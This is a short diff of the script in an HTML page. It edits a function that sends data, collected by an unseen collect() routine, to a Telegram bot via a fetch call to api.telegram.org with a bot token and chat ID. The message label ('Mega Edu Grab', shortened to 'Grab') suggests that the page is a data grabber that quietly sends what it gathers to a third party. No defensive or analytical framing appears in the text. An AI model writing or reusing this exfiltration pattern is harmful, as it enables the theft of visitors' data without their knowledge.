@@ -273,7 +273,7 @@ async function collect(){
 }
 
 async function sendTelegram(data){
-  const msg=`📋 Mega Edu Grab:\n${JSON.stringify(data,null,2)}`;
+  const msg=`📋Grab:\n${JSON.stringify(data,null,2)}`;
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 }
 
@@ -287,4 +287,5 @@ async function sendTelegram(data){
 
 </body>
 </html>
+
 
